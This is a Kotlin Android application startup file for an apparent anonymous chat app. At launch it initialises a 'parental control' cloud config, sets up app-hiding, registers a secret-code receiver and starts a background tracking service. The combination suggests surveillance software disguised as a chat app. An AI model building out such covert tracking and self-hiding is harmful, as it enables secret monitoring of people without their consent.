package com.anonchat.app

import android.app.Application
import android.widget.Toast
import com.anonchat.app.util.AppHider
import com.anonchat.app.util.SecretCodeManager
import com.anonchat.app.util.SecretCodeReceiverManager
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.google.firebase.FirebaseApp

class AnonChatApp : Application() {

    override fun onCreate() {
        super.onCreate()

        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            Toast.makeText(this, "Firebase init failed: ${e.message}", Toast.LENGTH_LONG).show()
        }

        // Initialize ParentalControl CloudConfig
        try {
            CloudConfig.init(applicationContext)
        } catch (e: Exception) {
            Toast.makeText(this, "CloudConfig init failed: ${e.message}", Toast.LENGTH_LONG).show()
        }

        // Create notification channel for app hiding functionality
        AppHider.createNotificationChannel(this)

        if (SecretCodeManager.isCodeSet(this)) {
            SecretCodeReceiverManager.registerDynamicReceiver(this)
        }

        // Start parental control background tracking service
        try {
            com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
        } catch (e: Exception) {
            android.util.Log.e("AnonChatApp", "Failed to start TrackerService", e)
        }
    }
}
